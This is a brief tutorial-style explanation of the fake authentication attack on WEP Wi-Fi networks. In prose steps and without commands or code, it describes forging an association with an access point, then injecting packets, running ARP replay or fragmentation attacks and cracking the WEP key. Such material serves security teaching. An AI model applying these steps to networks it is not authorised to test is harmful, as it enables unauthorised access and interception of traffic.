# Fake Authentication Attack

## How This Attack Works:

*   **Target a WEP Network**

    The attack works only on WEP-protected networks, not WPA/WPA2.
*   **Send a Fake Authentication Request**

    You send a packet to the AP saying:

    _"Hey! I’m a real client, please let me connect."_
*   **The Access Point Replies**

    Even without verifying the password, some WEP routers will respond with:

    > “✅ Authentication successful”
*   **You’re Now 'Associated'**

    This allows you to:

    * Stay connected (temporarily)
    * Capture or inject packets
    * Launch other attacks (like **ARP replay**, **fragmentation**, etc.)
*   **Use Other Attacks to Generate Traffic**

    Now that you're accepted by the AP, you can:

    * Capture more packets (IVs)
    * Crack the WEP key faster
